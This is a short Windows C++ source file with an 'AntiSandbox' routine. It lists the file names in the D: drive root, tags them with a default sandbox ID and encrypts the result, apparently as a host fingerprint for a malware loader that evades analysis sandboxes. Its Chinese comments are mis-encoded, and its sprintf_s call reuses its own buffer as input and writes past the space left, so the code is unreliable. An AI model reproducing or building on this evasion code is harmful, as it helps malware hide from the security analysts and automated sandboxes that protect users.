#include <iostream>
#include <windows.h>

#include "Cryptor.h"

using namespace std;

// ��ɳ��: ��ȡ D ���ļ�Ŀ¼
void AntiSandbox(char** pDetermineData, int* pDetermineDataLength) {
    *pDetermineData = (char*)malloc(1000);
    // ��ɳ�䡰����ID��Ĭ��Ϊ0
    **pDetermineData = '0';
    *(*pDetermineData + 1) = '\0';
    *(*pDetermineData + 2) = '\0';

    char drive[] = { 'D',':','\\','*','\0' };
    WIN32_FIND_DATAA findData;
    HANDLE hFile = FindFirstFileA(drive, &findData);
    if (hFile != INVALID_HANDLE_VALUE) {
        do {
            sprintf_s(*pDetermineData + 2, 1000, "%s,%s", *pDetermineData + 2, findData.cFileName);
        } while (FindNextFileA(hFile, &findData));
        FindClose(hFile);
    }
    *pDetermineDataLength = 2 + strlen(*pDetermineData + 2);

    EncryptData(*pDetermineData, *pDetermineDataLength);
}